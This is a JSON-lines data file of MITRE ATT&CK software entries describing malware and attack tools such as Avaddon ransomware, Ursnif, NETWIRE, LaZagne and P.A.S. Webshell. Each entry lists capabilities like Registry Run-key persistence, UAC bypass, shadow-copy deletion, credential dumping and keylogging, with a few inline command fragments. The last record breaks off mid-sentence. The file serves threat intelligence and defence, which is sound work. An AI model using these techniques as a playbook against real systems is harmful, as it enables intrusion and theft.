{"text": " [GeminiDuke](https://attack.mitre.org/software/S0049) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2009 to 2012. (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0049", "title": "GeminiDuke", "entity": "GeminiDuke", "entity_type": "software", "entity_context": ["GeminiDuke uses HTTP and HTTPS for command and control.", "GeminiDuke collects information on local user accounts from the victim.", "GeminiDuke collects information on network settings and Internet proxy settings from the victim.", "GeminiDuke collects information on running processes and environment variables from the victim.", "GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.", "GeminiDuke collects information on programs and services on the victim that are configured to automatically run at startup."], "is_subtechnique": false}
{"text": " [CORESHELL](https://attack.mitre.org/software/S0137) is a downloader used by [APT28](https://attack.mitre.org/groups/G0007). The older versions of this malware are known as SOURFACE and newer versions as CORESHELL.(Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)", "idx": "https://attack.mitre.org/software/S0137", "title": "CORESHELL", "entity": "CORESHELL", "entity_type": "software", "entity_context": ["CORESHELL C2 messages are Base64-encoded.", "CORESHELL can communicate over SMTP and POP3 for C2.", "CORESHELL C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.", "CORESHELL downloads another dropper from its C2 server.", "CORESHELL contains unused machine instructions in a likely attempt to hinder analysis.", "CORESHELL obfuscates strings using a custom stream cipher.", "CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.", "CORESHELL can communicate over HTTP for C2.", "CORESHELL has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.", "CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\""], "is_subtechnique": false}
{"text": " [Avaddon](https://attack.mitre.org/software/S0640) is ransomware written in C++ that has been offered as Ransomware-as-a-Service (RaaS) since at least June 2020.(Citation: Awake Security Avaddon)(Citation: Arxiv Avaddon Feb 2021)", "idx": "https://attack.mitre.org/software/S0640", "title": "Avaddon", "entity": "Avaddon", "entity_type": "software", "entity_context": ["Avaddon has used encrypted strings.", "Avaddon can collect the external IP address of the victim.", "Avaddon deletes backups and shadow copies using native system tools.", "Avaddon encrypts the victim system using a combination of AES256 and RSA encryption schemes.", "Avaddon modifies several registry keys for persistence and UAC bypass.", "Avaddon has been executed through a malicious JScript downloader.", "Avaddon has collected information about running processes.", "Avaddon looks for and attempts to stop database processes.", "Avaddon uses registry run keys for persistence.", "Avaddon has enumerated shared folders and mapped volumes.", "Avaddon has used the Windows Crypto API to generate an AES key.", "Avaddon has decrypted encrypted strings.", "Avaddon has searched for specific files prior to encryption.", "Avaddon bypasses UAC using the CMSTPLUA COM interface. ", "Avaddon checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.", "Avaddon uses wmic.exe to delete shadow copies.", "Avaddon looks for and attempts to stop anti-malware solutions."], "is_subtechnique": false}
{"text": " [Truvasys](https://attack.mitre.org/software/S0178) is first-stage malware that has been used by [PROMETHIUM](https://attack.mitre.org/groups/G0056). It is a collection of modules written in the Delphi programming language. (Citation: Microsoft Win Defender Truvasys Sep 2017) (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21)", "idx": "https://attack.mitre.org/software/S0178", "title": "Truvasys", "entity": "Truvasys", "entity_type": "software", "entity_context": ["To establish persistence, Truvasys adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.", "Truvasys adds a Registry Run key to establish persistence."], "is_subtechnique": false}
{"text": " [Gold Dragon](https://attack.mitre.org/software/S0249) is a Korean-language, data gathering implant that was first observed in the wild in South Korea in July 2017. [Gold Dragon](https://attack.mitre.org/software/S0249) was used along with [Brave Prince](https://attack.mitre.org/software/S0252) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations targeting organizations associated with the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)", "idx": "https://attack.mitre.org/software/S0249", "title": "Gold Dragon", "entity": "Gold Dragon", "entity_type": "software", "entity_context": ["Gold Dragon establishes persistence in the Startup folder.", "Gold Dragon collects endpoint information using the <code>systeminfo</code> command.", "Gold Dragon terminates anti-malware processes if they’re found running on the system.", "Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.", "Gold Dragon lists the directories for Desktop, program files, and the user’s recently accessed files.", "Gold Dragon checks the running processes on the victim’s machine.", "Gold Dragon encrypts data using Base64 before being sent to the command and control server.", "Gold Dragon checks for anti-malware products and processes.", "Gold Dragon uses cmd.exe to execute commands for discovery.", "Gold Dragon stores information gathered from the endpoint in a file named 1.hwp.", "Gold Dragon enumerates registry keys with the command <code>regkeyenum</code> and obtains information for the Registry key <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", "Gold Dragon can download additional components from the C2 server.", "Gold Dragon deletes one of its files, 2.hwp, from the endpoint after establishing persistence.", "Gold Dragon uses HTTP for communication to the control servers."], "is_subtechnique": false}
{"text": " [Anchor](https://attack.mitre.org/software/S0504) is one of a family of backdoor malware that has been used in conjunction with [TrickBot](https://attack.mitre.org/software/S0266) on selected high profile targets since at least 2018.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020)", "idx": "https://attack.mitre.org/software/S0504", "title": "Anchor", "entity": "Anchor", "entity_type": "software", "entity_context": ["Anchor has obsuscated code with stack strings and string encryption.", "Anchor has used ICMP in C2 communications.", "Anchor can terminate itself if specific execution flags are not present.", "Anchor can determine the hostname and linux version on a compromised host.", "Anchor can create and execute services to load its payload.", "Variants of Anchor can use DNS tunneling to communicate with C2.", "Anchor has come with a packed payload.", "Anchor can establish persistence by creating a service.\t", "Anchor has used cmd.exe to run its self deletion routine.", "Anchor has used HTTP and HTTPS in C2 communications.", "Anchor can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.", "Anchor can determine the public IP and location of a compromised host.", "Anchor can download additional payloads.", "Anchor has used NTFS to hide files.", "Anchor can self delete its dropper after the malware is successfully deployed.", "Anchor can create a scheduled task for persistence.", "Anchor can install itself as a cron job.", "Anchor has been signed with valid certificates to evade detection by security tools.", "Anchor can execute payloads via shell scripting.", "Anchor can support windows execution via SMB shares."], "is_subtechnique": false}
{"text": " [Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, and malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)", "idx": "https://attack.mitre.org/software/S0386", "title": "Ursnif", "entity": "Ursnif", "entity_type": "software", "entity_context": ["Ursnif has gathered information about running processes.", "Ursnif droppers have used VBA macros to download and execute the malware's full executable payload.", "Ursnif has used tmp files to stage gathered information.", "Ursnif droppers have used COM objects to execute the malware's full executable payload.", "Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.", "Ursnif has used Registry Run keys to establish automatic execution at system startup.", "Ursnif droppers have used WMI classes to execute PowerShell commands.", "Ursnif has used a DGA to generate domain names for C2.", "Ursnif has injected code into target processes via thread local storage callbacks.", "Ursnif has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers.", "Ursnif has copied itself to and infected files in network drives for propagation.", "Ursnif has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.", "Ursnif has used hooked APIs to take screenshots.", "Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools.", "Ursnif has used a peer-to-peer (P2P) network for C2.", "Ursnif has copied itself to and infected removable drives for propagation.", "Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk.\tUrsnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.", "Ursnif droppers have used COM properties to execute malware in hidden windows.", "Ursnif has used Systeminfo to gather system information.", "Ursnif has used encoded data in HTTP URLs for C2.\t", "Ursnif has deleted data staged in tmp files after exfiltration.", "Ursnif has used Tor for C2.", "Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload.", "Ursnif has used <code>CreateProcessW</code> to create child processes.", "Ursnif has used Reg to query the Registry for installed programs.", "Ursnif has registered itself as a system service in the Registry for automatic execution at system startup.", "Ursnif has used HTTPS for C2.", "Ursnif has dropped payload and configuration files to disk. Ursnif has also been used to download and execute additional payloads.", "Ursnif has used HTTP POSTs to exfil gathered information.", "Ursnif has collected files from victim machines, including certificates and cookies.", "Ursnif has used Registry modifications as part of its installation routine.", "Ursnif has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).", "Ursnif has gathered information about running services.", "Ursnif has used process hollowing to inject into child processes."], "is_subtechnique": false}
{"text": " [P.A.S. Webshell](https://attack.mitre.org/software/S0598) is a publicly available multifunctional PHP webshell in use since at least 2016 that provides remote access and execution on target web servers.(Citation: ANSSI Sandworm January 2021)", "idx": "https://attack.mitre.org/software/S0598", "title": "P.A.S. Webshell", "entity": "P.A.S. Webshell", "entity_type": "software", "entity_context": ["P.A.S. Webshell can upload and download files to and from compromised hosts.", "P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution.", "P.A.S. Webshell can scan networks for open ports and listening services.", "P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.", "P.A.S. Webshell can use encryption and base64 encoding to hide strings and to enforce access control once deployed.", "P.A.S. Webshell has the ability to create reverse shells with Perl scripts.", "P.A.S. Webshell can list PHP server configuration details.", "P.A.S. Webshell has the ability to copy files on a compromised host.", "P.A.S. Webshell can gain remote access and execution on target web servers.", "P.A.S. Webshell has the ability to modify file permissions.", "P.A.S. Webshell can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.", "P.A.S. Webshell can issue commands via HTTP POST.", "P.A.S. Webshell has the ability to list and extract data from SQL databases.", "P.A.S. Webshell can display the /etc/passwd file on a compromised host.", "P.A.S. Webshell can delete scripts from a subdirectory of /tmp after they are run."], "is_subtechnique": false}
{"text": " [POWERSOURCE](https://attack.mitre.org/software/S0145) is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017)", "idx": "https://attack.mitre.org/software/S0145", "title": "POWERSOURCE", "entity": "POWERSOURCE", "entity_type": "software", "entity_context": ["POWERSOURCE is a PowerShell backdoor.", "POWERSOURCE achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.", "POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.", "POWERSOURCE uses DNS TXT records for C2.", "POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence.", "If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in <code>%PROGRAMDATA%\\Windows\\</code>."], "is_subtechnique": false}
{"text": " [LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)", "idx": "https://attack.mitre.org/software/S0349", "title": "LaZagne", "entity": "LaZagne", "entity_type": "software", "entity_context": ["LaZagne can obtain credentials from macOS Keychains.\t", "LaZagne can perform credential dumping from LSA secrets to obtain account and password information.", "LaZagne can obtain credential information from /etc/shadow using the shadow.py module.", "LaZagne can obtain credentials from Vault files.\t", "LaZagne can obtain credentials from chats, databases, mail, and WiFi.", "LaZagne can perform credential dumping from memory to obtain account and password information.", "LaZagne can perform credential dumping from MSCache to obtain account and password information.", "LaZagne can obtain credentials from databases, mail, and WiFi across multiple platforms.", "LaZagne can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.", "LaZagne can obtain credential information running Linux processes."], "is_subtechnique": false}
{"text": " [CSPY Downloader](https://attack.mitre.org/software/S0527) is a tool designed to evade analysis and download additional payloads used by [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Cybereason Kimsuky November 2020)", "idx": "https://attack.mitre.org/software/S0527", "title": "CSPY Downloader", "entity": "CSPY Downloader", "entity_type": "software", "entity_context": ["CSPY Downloader can use the schtasks utility to bypass UAC.", "CSPY Downloader can download additional tools to a compromised host.", "CSPY Downloader can write to the Registry under the <code>%windir%</code> variable to execute tasks.", "CSPY Downloader has been packed with UPX.", "CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.", "CSPY Downloader has been delivered via malicious documents with embedded macros.", "CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.", "CSPY Downloader can use GET requests to download additional payloads from C2.", "CSPY Downloader has the ability to self delete.", "CSPY Downloader has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.", "CSPY Downloader has the ability to remove values it writes to the Registry.", "CSPY Downloader has come signed with revoked certificates."], "is_subtechnique": false}
{"text": " [FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. (Citation: Wikipedia FTP)", "idx": "https://attack.mitre.org/software/S0095", "title": "FTP", "entity": "FTP", "entity_type": "software", "entity_context": ["FTP may be used to exfiltrate data separate from the main command and control protocol.", "FTP operates over ports 21 and 20."], "is_subtechnique": false}
{"text": " [NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012.(Citation: FireEye APT33 Sept 2017)(Citation: McAfee Netwire Mar 2015)(Citation: FireEye APT33 Webinar Sept 2017)", "idx": "https://attack.mitre.org/software/S0198", "title": "NETWIRE", "entity": "NETWIRE", "entity_type": "software", "entity_context": ["NETWIRE can copy itself to and launch itself from hidden folders.", "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.", "The NETWIRE binary has been executed via PowerShell script.", "NETWIRE can use XDG Autostart Entries to establish persistence.", "NETWIRE can retrieve passwords from messaging and mail client applications.", "The NETWIRE client has been signed by fake and invalid digital certificates.", "NETWIRE can issue commands using cmd.exe.", "NETWIRE stores its configuration file within the Registry.", "NETWIRE can create a scheduled task to establish persistence.", "NETWIRE can discover and close windows on controlled systems.", "The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.", "NETWIRE can use Native API including <code>CreateProcess</code> <code>GetProcessById</code>, and <code>WriteProcessMemory</code>.", "NETWIRE has masqueraded as legitimate software including TeamViewer and macOS Finder.", "NETWIRE can persist via startup options for Login items.", "NETWIRE has been executed through use of VBScripts.", "NETWIRE can capture the victim's screen.", "NETWIRE can use crontabs to establish persistence.", "NETWIRE creates a Registry start-up entry to establish persistence.", "NETWIRE can downloaded payloads from C2 to the compromised host.", "NETWIRE has been executed through luring victims into opening malicious documents.", "NETWIRE has the ability to compress archived screenshots.", "NETWIRE can collect the IP address of a compromised host.", "NETWIRE has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.", "NETWIRE has the ability to search for files on the compromised host.", "NETWIRE has used .NET packer tools to evade detection.", "NETWIRE can discover processes on compromised hosts.", "NETWIRE can use launch agents for persistence.", "NETWIRE has the ability to communicate over HTTP.", "NETWIRE has been spread via e-mail campaigns utilizing malicious links.", "NETWIRE can implement use of proxies to pivot traffic.", "NETWIRE has used a custom encryption algorithm to encrypt collected data.", "NETWIRE can capture session logon details from a compromised host.", "NETWIRE can discover and collect victim system information.", "NETWIRE has been spread via e-mail campaigns utilizing malicious attachments.", "NETWIRE can perform keylogging.", "NETWIRE has the ability to write collected data to a file created in the <code>./LOGS</code> directory.", "NETWIRE can automatically archive collected data.", "NETWIRE has been executed through convincing victims into clicking malicious links.", "NETWIRE has used web services including Paste.ee to host payloads.", "NETWIRE can encrypt C2 communications.", "NETWIRE has the ability to use <code>/bin/bash</code> and <code>/bin/sh</code> to execute commands.", "NETWIRE can use TCP in C2 communications.", "NETWIRE can use AES encryption for C2 data transferred.", "NETWIRE has the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome."], "is_subtechnique": false}
{"text": " [Cardinal RAT](https://attack.mitre.org/software/S0348) is a potentially low volume remote access trojan (RAT) observed since December 2015. [Cardinal RAT](https://attack.mitre.org/software/S0348) is notable for its unique utilization of uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.(Citation: PaloAlto CardinalRat Apr 2017)", "idx": "https://attack.mitre.org/software/S0348", "title": "Cardinal RAT", "entity": "Cardinal RAT", "entity_type": "software", "entity_context": ["Cardinal RAT can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.", "Cardinal RAT can capture screenshots.", "Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).", "Cardinal RAT encodes many of its artifacts and is encrypted (AES-128) when downloaded. ", "Cardinal RAT and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.", "Cardinal RAT uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.", "Cardinal RAT can communicate over multiple C2 host and port combinations.", "Cardinal RAT contains watchdog functionality that periodically ensures <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> is set to point to its executable.", "Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded.", "Cardinal RAT applies compression to C2 traffic using the ZLIB library.", "Cardinal RAT lures victims into executing malicious macros embedded within Microsoft Excel documents.", "Cardinal RAT can collect the username from a victim machine.", "Cardinal RAT establishes Persistence by setting the  <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> Registry key to point to its executable.", "Cardinal RAT can uninstall itself, including deleting its executable.", "Cardinal RAT contains watchdog functionality that ensures its process is always running, else spawns a new instance.", "Cardinal RAT injects into a newly spawned process created from a native Windows executable.", "Cardinal RAT is downloaded using HTTP over port 443.", "Cardinal RAT can act as a reverse proxy.", "Cardinal RAT can download and execute additional payloads.", "Cardinal RAT sets <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> to point to its executable.", "Cardinal RAT can execute commands.", "Cardinal RAT can log keystrokes."], "is_subtechnique": false}
{"text": " [Remcos](https://attack.mitre.org/software/S0332) is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security. [Remcos](https://attack.mitre.org/software/S0332) has been observed being used in malware campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018)", "idx": "https://attack.mitre.org/software/S0332", "title": "Remcos", "entity": "Remcos", "entity_type": "software", "entity_context": ["Remcos takes automated screenshots of the infected machine.", "Remcos has a command for keylogging.", "Remcos can access a system’s webcam and take pictures.", "Remcos can add itself to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "Remcos can upload and download files to and from the victim’s machine.", "Remcos can search for files on the infected machine.", "Remcos has a command for UAC bypassing.", "Remcos has a command to hide itself through injecting into another process.", "Remcos uses Python scripts.", "Remcos can capture data from the system’s microphone.", "Remcos uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.", "Remcos uses RC4 and base64 to obfuscate data, including Registry entries and file paths.", "Remcos has full control of the Registry, including the ability to modify it.", "Remcos searches for Sandboxie and VMware on the system.", "Remcos can launch a remote command line to execute commands on the victim’s machine.", "Remcos steals and modifies data from the clipboard."], "is_subtechnique": false}
{"text": " [Trojan.Karagany](https://attack.mitre.org/software/S0094) is a modular remote access tool used for recon and linked to [Dragonfly](https://attack.mitre.org/groups/G0035) and [Dragonfly 2.0](https://attack.mitre.org/groups/G0074). The source code for [Trojan.Karagany](https://attack.mitre.org/software/S0094) originated from Dream Loader malware which was leaked in 2010 and sold on underground forums. (Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019)(Citation: Dragos DYMALLOY )", "idx": "https://attack.mitre.org/software/S0094", "title": "Trojan.Karagany", "entity": "Trojan.Karagany", "entity_type": "software", "entity_context": ["Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.", "Trojan.Karagany can base64 encode and AES-128-CBC encrypt data prior to transmission.", "Trojan.Karagany can monitor the titles of open windows to identify specific keywords.\t ", "Trojan.Karagany can use Tasklist to collect a list of running tasks.", "Trojan.Karagany can upload, download, and execute files on the victim.", "Trojan.Karagany can gather information on the network configuration of a compromised host.", "Trojan.Karagany samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.", "Trojan.Karagany can take a desktop screenshot and save the file into <code>\\ProgramData\\Mail\\MailAg\\shot.png</code>.", "Trojan.Karagany can gather information about the user on a compromised host.", "Trojan.Karagany can secure C2 communications with SSL and TLS.", "Trojan.Karagany can capture information regarding the victim's OS, security, and hardware configuration.", "Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the <code>ResumeThread</code> API.", "Trojan.Karagany can create directories to store plugin output and stage data for exfiltration.", "Trojan.Karagany can create a link to itself in the Startup folder to automatically start itself upon system restart.", "Trojan.Karagany can enumerate files and directories on a compromised host.", "Trojan.Karagany can dump passwords and save them into <code>\\ProgramData\\Mail\\MailAg\\pwds.txt</code>.", "Trojan.Karagany can communicate with C2 via HTTP POST requests.", "Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.", "Trojan.Karagany can capture keystrokes on a compromised host.", "Trojan.Karagany can steal data and credentials from browsers.", "Trojan.Karagany has used plugins with a self-delete capability.", "Trojan.Karagany can use netstat to collect a list of network connections."], "is_subtechnique": false}
{"text": " [ELMER](https://attack.mitre.org/software/S0064) is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by [APT16](https://attack.mitre.org/groups/G0023). (Citation: FireEye EPS Awakens Part 2)", "idx": "https://attack.mitre.org/software/S0064", "title": "ELMER", "entity": "ELMER", "entity_type": "software", "entity_context": ["ELMER is capable of performing directory listings.", "ELMER is capable of performing process listings.", "ELMER uses HTTP over port 443 for command and control.", "ELMER uses HTTP for command and control."], "is_subtechnique": false}
{"text": " [PLAINTEE](https://attack.mitre.org/software/S0254) is a malware sample that has been used by [Rancor](https://attack.mitre.org/groups/G0075) in targeted attacks in Singapore and Cambodia. (Citation: Rancor Unit42 June 2018)", "idx": "https://attack.mitre.org/software/S0254", "title": "PLAINTEE", "entity": "PLAINTEE", "entity_type": "software", "entity_context": ["PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.", "PLAINTEE has downloaded and executed additional plugins.", "PLAINTEE uses cmd.exe to execute commands on the victim’s machine.", "PLAINTEE uses <code>reg add</code> to add a Registry Run key for persistence.", "PLAINTEE uses the <code>ipconfig /all</code> command to gather the victim’s IP address.", "PLAINTEE gains persistence by adding the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>.", "PLAINTEE encodes C2 beacons using XOR.", "PLAINTEE performs the <code>tasklist</code> command to list running processes.", "An older variant of PLAINTEE performs UAC bypass."], "is_subtechnique": false}
{"text": " [Emissary](https://attack.mitre.org/software/S0082) is a Trojan that has been used by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It shares code with [Elise](https://attack.mitre.org/software/S0081), with both Trojans being part of a malware group referred to as LStudio. (Citation: Lotus Blossom Dec 2015)", "idx": "https://attack.mitre.org/software/S0082", "title": "Emissary", "entity": "Emissary", "entity_type": "software", "entity_context": ["Emissary is capable of configuring itself as a service.", "Emissary has the capability to execute ver and systeminfo commands.", "Emissary uses HTTP or HTTPS for C2.", "A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.", "Emissary has the capability to execute the command <code>net start</code> to interact with services.", "Emissary has the capability to execute the command <code>net localgroup administrators</code>.", "Variants of Emissary have added Run Registry keys to establish persistence.", "Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.", "Emissary has the capability to execute the command <code>ipconfig /all</code>.", "Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.", "The C2 server response to a beacon sent by a variant of Emissary contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of Emissary use various XOR operations to encrypt C2 data.", "Emissary has the capability to download files from the C2 server.", "Emissary has the capability to execute <code>gpresult</code>.", "Emissary has the capability to create a remote shell and execute specified commands.", "Emissary injects its DLL file into a newly spawned Internet Explorer process."], "is_subtechnique": false}
{"text": " [TEXTMATE](https://attack.mitre.org/software/S0146) is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with [POWERSOURCE](https://attack.mitre.org/software/S0145) in February 2017. (Citation: FireEye FIN7 March 2017)", "idx": "https://attack.mitre.org/software/S0146", "title": "TEXTMATE", "entity": "TEXTMATE", "entity_type": "software", "entity_context": ["TEXTMATE uses DNS TXT records for C2.", "TEXTMATE executes cmd.exe to provide a reverse shell to adversaries."], "is_subtechnique": false}
{"text": " [Raindrop](https://attack.mitre.org/software/S0565) is a loader used by [APT29](https://attack.mitre.org/groups/G0016) that was discovered on some victim machines during investigations related to the 2020 SolarWinds cyber intrusion. It was discovered in January 2021 and was likely used since at least May 2020.(Citation: Symantec RAINDROP January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)", "idx": "https://attack.mitre.org/software/S0565", "title": "Raindrop", "entity": "Raindrop", "entity_type": "software", "entity_context": ["Raindrop used a custom packer for its Cobalt Strike payload, which was compressed using the LZMA algorithm.", "Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.", "Raindrop was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.", "After initial installation, Raindrop runs a computation to delay execution.", "Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.", "Raindrop used steganography to locate the start of its encoded payload within legitimate 7-Zip code.", "Raindrop was installed under names that resembled legitimate Windows file and directory names."], "is_subtechnique": false}
{"text": " [Pasam](https://attack.mitre.org/software/S0208) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam May 2012)", "idx": "https://attack.mitre.org/software/S0208", "title": "Pasam", "entity": "Pasam", "entity_type": "software", "entity_context": ["Pasam creates a backdoor through which remote attackers can retrieve lists of files.", "Pasam creates a backdoor through which remote attackers can retrieve lists of running processes.", "Pasam connects to external C2 infrastructure and opens a backdoor over port 443.", "Pasam creates a backdoor through which remote attackers can retrieve files.", "Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.", "Pasam creates a backdoor through which remote attackers can upload files.", "Pasam establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.", "Pasam creates a backdoor through which remote attackers can delete files."], "is_subtechnique": false}
{"text": " [BloodHound](https://attack.mitre.org/software/S0521) is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.(Citation: GitHub Bloodhound)(Citation: CrowdStrike BloodHound April 2018)(Citation: FoxIT Wocao December 2019)", "idx": "https://attack.mitre.org/software/S0521", "title": "BloodHound", "entity": "BloodHound", "entity_type": "software", "entity_context": ["BloodHound can collect information about domain groups and members.", "BloodHound can enumerate and collect the properties of domain computers, including domain controllers.", "BloodHound can collect information on user sessions.", "BloodHound can use PowerShell to pull Active Directory information from the target environment.", "BloodHound can collect password policy information on the target environment.", "BloodHound has the ability to map domain trusts and identify misconfigurations for potential abuse.", "BloodHound can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.", "BloodHound can collect information about domain users, including identification of domain admin accounts.", "BloodHound can identify users with local administrator rights.", "BloodHound has the ability to collect local admin information via GPO.", "BloodHound can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.", "BloodHound can collect information about local groups and members."], "is_subtechnique": false}
{"text": " [KeyBoy](https://attack.mitre.org/software/S0387) is malware that has been used in targeted campaigns against members of the Tibetan Parliament in 2016.(Citation: CitizenLab KeyBoy Nov 2016)(Citation: PWC KeyBoys Feb 2017)", "idx": "https://attack.mitre.org/software/S0387", "title": "KeyBoy", "entity": "KeyBoy", "entity_type": "software", "entity_context": ["In one version of KeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware.", "KeyBoy installs a service pointing to a malicious DLL dropped to disk.", "KeyBoy installs a keylogger for intercepting credentials and keystrokes.", "KeyBoy uses PowerShell commands to download and execute payloads.", "KeyBoy issues the command <code>reg add “HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon”</code> to achieve persistence. ", "KeyBoy can determine the public or WAN IP address for the system.", "KeyBoy has a download and upload functionality.", "KeyBoy has a command to perform screen grabbing.", "KeyBoy calls back to the C2 server over ports 53, 80, and 443.", "KeyBoy uses custom SSL libraries to impersonate SSL in C2 traffic.", "KeyBoy has a command to launch a file browser or explorer on the system.", "KeyBoy can gather extended system information, such as information about the operating system, disks, and memory.", "KeyBoy uses <code>-w Hidden</code> to conceal a PowerShell window that downloads a payload. ", "KeyBoy uses the Dynamic Data Exchange (DDE) protocol to download remote payloads.", "KeyBoy uses Python scripts for installing files and performing execution.", "KeyBoy attempts to collect passwords from browsers.", "KeyBoy can launch interactive shells for communicating with the victim machine.", "KeyBoy uses VBS scripts for installing files and performing execution.", "KeyBoy time-stomped its 